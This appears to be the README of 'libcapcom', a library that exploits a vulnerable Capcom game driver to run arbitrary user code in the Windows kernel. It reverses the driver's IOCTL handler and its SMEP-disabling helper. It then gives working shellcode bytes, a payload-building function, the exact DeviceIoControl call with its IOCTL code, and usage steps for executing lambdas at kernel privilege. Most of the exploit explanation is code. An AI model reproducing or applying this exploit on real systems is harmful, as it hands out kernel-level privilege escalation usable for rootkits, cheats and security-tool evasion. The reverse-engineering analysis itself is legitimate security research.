# libcapcom - Execute arbitrary code in the kernel
## Background
Links to what happened:
* https://www.reddit.com/r/Games/comments/545cjy/sfvs_new_pc_update_is_accessing_kernel_level_in/
* https://twitter.com/bill307_ca/status/779496079519801344
* https://twitter.com/thewack0lian/status/779397840762245124

Capcom decides to ship a driver with a custom IOCTL that accepts a buffer from usermode, and executes it. Let's dive into how/why this works.

## Exploit
### IOCTL Handler
The interesting part of this exploit begins at ```Capcom.sys + 0x590```, the IOCTL handler. Here is the disassembled pseudocode:
```cpp
__int64 __fastcall sub_10590(__int64 a1, struct _IRP *a2)
{
    if ( *(_BYTE *)v2 == 14 )
    {
        requiredInputBufferSize = 0;
        requiredOutputBufferSize = 0;
        if ( controlCode == 0xAA012044 )
        {
            requiredOutputBufferSize = 4;
            requiredInputBufferSize = 4;
        }
        else if ( controlCode == 0xAA013044 )
        {
            requiredInputBufferSize = 8;
            requiredOutputBufferSize = 4;
        }
        if ( inputBufferSize != requiredInputBufferSize || 
             outputBufferSize != requiredOutputBufferSize )
        {
            v7->IoStatus.Status = 0xC000000D;
            goto LABEL_16;
        }
        if ( controlCode == 0xAA012044 )
        {
            v11 = *(_DWORD *)inputBuffer;
        }
        else
        {
            if ( controlCode != 0xAA013044 )
            {
        LABEL_14:
                *(_DWORD *)inputBuffer = v4;
                v7->IoStatus.Information = (unsigned int)requiredOutputBufferSize;
                goto LABEL_16;
            }
            v11 = *(_QWORD *)inputBuffer;
        }
        v4 = sub_10524(v11);
        goto LABEL_14;
    }
    v7->IoStatus.Status = 0xC0000002;
LABEL_16:
    IofCompleteRequest(v7, 0);
    return v7->IoStatus.Status;
}
```
The code basically does the following:
1. Check if the control code is for a 32-bit (0xAA012044) or 64-bit (0xAA013044) request
2. Check to see if the IRP packet has proper sizes. If for a 32-bit request, the input and output buffer sizes **must be 4**. If for a 64-bit request, the input buffer size **must be 8** AND the output buffer size **must be 4**
3. Set ```v11``` to the value that is pointed to by the address at ```inputBuffer```.
4. Call ```sub_10524``` with parameter v11.
5. Finish by calling ```IofCompleteRequest```

### Calling the usermode function
Obviously, the natural reaction is to take a look at ```sub_10524```, located at ```Capcom.sys + 0x524```. Here is the disassembly:

```cpp
signed __int64 __fastcall sub_10524(__int64 fnPtrFromBuffer)
{
    if ( *(_QWORD *)(fnPtrFromBuffer - 8) == fnPtrFromBuffer )
    {
        userFn = (void (__fastcall *)(PVOID (__stdcall *)(PUNICODE_STRING)))fnPtrFromBuffer;
        pMmGetSystemRoutineAddress = MmGetSystemRoutineAddress;
        v2 = 0i64;
        sub_10788((unsigned __int64 *)&v2);
        userFn(pMmGetSystemRoutineAddress);
        sub_107A0((unsigned __int64 *)&v2);
        result = 1i64;
    }
    else
    {
        result = 0i64;
    }
    return result;
}
```

This function is where the juicy exploit comes into play. 
1. The pointer passed into ```sub_10524``` as the first parameter is cast to a function
2. **A very odd check to make sure that the first 8 bytes of the inputBuffer is equal to the address of the function, which lives at** ```inputBuffer + 0x8```
3. The address of the system routine ```MmGetSystemRoutineAddress``` is saved to a local variable
4. An unknown function ```sub_10788``` is called
5. The function in usermode defined in the first parameter is called **with the address of the function MmGetSystemRoutineAddress**
6. Another unknown function ```sub_107A0``` is called

### Supervisor Mode Execution Protection
Quoting the Intel Manual Volume 3A, 4-3, Paragraph 4.1.3:
>CR4.SMEP allows pages to be protected from supervisor-mode instruction fetches.   
If CR4.SMEP = 1, software operating in supervisor mode cannot fetch instructions from linear addresses that are accessible in user mode.

Basically, SMEP is a CPU mitigation that prevents the kernel from executing code that lives in the virtual address space of a usermode process.  
Going back to the exploit, we see that before the function defined by our input buffer is called, we call ```sub_10788```. It is not unreasonable to guess that this function does something to ```CR4.SMEP```.

```
unsigned __int64 __fastcall sub_10788(unsigned __int64 *a1)
{
    unsigned __int64 v1; // rax@1
    unsigned __int64 result; // rax@1

    _disable();
    v1 = __readcr4();
    *a1 = v1;
    result = v1 & 0xFFFFFFFFFFEFFFFFui64;
    __writecr4(result);
    return result;
}
```

And what do you know, ```sub_10788``` disables SMEP, allowing our function in usermode to be called in the context of the kernel.  
At this point it should be pretty obvious that ```sub_107A0```, the second unknown function called, sets SMEP back to its original state, so I will leave out the disassembly of that function.

## Implementation
The implementation at this point should be pretty straightforward now that we know how the driver interacts with data passed to its IOCTL handler. I will be outlining the few caveats that are required for a usermode function to be called in the context of the kernel.

### Constructing the payload

Earlier we saw that the first 8 bytes of the input buffer must be equal to the address of the usermode function. Let's create a ```struct``` that defines our payload:

```cpp
struct capcom_payload
{
    void* ptr_to_code;
    uint8_t code[sizeof(code_template)];
};
```
We are going to want ```ptr_to_code``` to point to the usermode function, defined by ```code```, an array of bytes when constructing the payload.  

The driver will directly start executing the code defined by our ```code``` byte array, and we know that **SMEP** is disabled at this point. Let's force the kernel to ``jmp`` to a usermode function that we can define.

```cpp
static const uint32_t user_function_ptr_offset = 0x2;
static uint8_t code_template[] =
{
	0x48, 0xB8, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, // movabs rax, user_function_ptr
	0xFF, 0xE0													// jmp rax
	};
```

This simple shellcode template will be the code that the driver executes for us. The first instruction will be ```movabs rax, user_function_ptr``` which moves the immediate 8 bytes into ```rax```. Next, it will execute ```jmp rax```, which jumps to the address stored in ```rax```, which will be our user-defined function pointer.  

Putting it all together, we get the following function:
```cpp
capcom_payload* build_capcom_payload(uintptr_t user_function_wrapper) 
{
    // allocate a page of executable memory for our payload
    capcom_payload* final_payload = (capcom_payload*)VirtualAlloc(nullptr, sizeof(capcom_payload), MEM_COMMIT, PAGE_EXECUTE_READWRITE);

    // copy our code template into the executable page
    memcpy(final_payload->code, code_template, sizeof(code_template));

    // fill this member to point to the actual code buffer (as required by capcom)
    final_payload->ptr_to_code = final_payload->code; 

    // fill in the function pointer that will be copied into rax, then jmp'd to
    *(uintptr_t*)(final_payload->code + user_function_ptr_offset) = (uintptr_t)user_function_wrapper; 

    return final_payload;
}
```

### Sending the payload to the Capcom driver
In the analysis of ```sub_10590``` above, there are quite a few checks that must pass in order for our usermode code to be called.
* Check to see if the IRP packet has proper sizes. If for a 32-bit request, the input and output buffer sizes **must be 4**. If for a 64-bit request, the input buffer size **must be 8** AND the output buffer size **must be 4**

In this library's implementation, it only deals with the 64-bit variant of the driver. Communicating with the driver involves the WinAPI function ```DeviceIoControl```, which takes a variety of parameters. Here is the function prototype as defined by MSDN:
```cpp
BOOL WINAPI DeviceIoControl(
  _In_        HANDLE       hDevice,
  _In_        DWORD        dwIoControlCode,
  _In_opt_    LPVOID       lpInBuffer,
  _In_        DWORD        nInBufferSize,
  _Out_opt_   LPVOID       lpOutBuffer,
  _In_        DWORD        nOutBufferSize,
  _Out_opt_   LPDWORD      lpBytesReturned,
  _Inout_opt_ LPOVERLAPPED lpOverlapped
);
```

* ```dwIoControlCode``` must be equal to ```0xAA013044```
* ```nInBufferSize``` must be equal to ```8```
* ```nOutBufferSize``` must be equal to ```4```

Putting this together, the code in ```capcom_wrapper.cpp``` calls:  
```cpp
DeviceIoControl(device, ioctl_x64, &payload->ptr_to_code, 8, &output_buffer, 4, &bytes_returned, nullptr)
```

## Things to consider
### How does the kernel jump to an address defined in another process' virtual address space?
```DeviceIoControl``` is a **system call**. System calls are handled by the kernel, but has access to the virtual address space of the process that invoked that syscall. For example, file and network I/O are handled by system calls, but the kernel could reasonably need access to the process' address space to pass data back to the process. Also keep in mind that a a system call does not cause a context switch, meaning that the processor context never actually changes.

### Is executing this code in the kernel safe?
No, this is inherently unsafe because the moment a context switch happens, **CR4** gets reset, meaning **SMEP** gets reset, and the moment we context switch back to the code in usermode, we get hit with a big fat BSOD. If one is interested in a safe implementation, I highly recommend reading https://blog.can.ac/2018/04/28/escape-smep-exploiting-capcom-safely/.

## How to use this library
1. Build the project
2. Link against **libcapcom.lib**
3. Include **libcapcom.h**
4. Call ```init_exploit()```
5. Call ```execute_in_kernel(std::function<void(MmGetSystemRoutineAddress_t)> user_function)``` with your defined lambda
6. Call ```cleanup_exploit()```

Further documentation of what each exported function does can be found in **libcapcom.h**, and an example of a project that uses this library can be found here: https://github.com/notscimmy/pplib. 
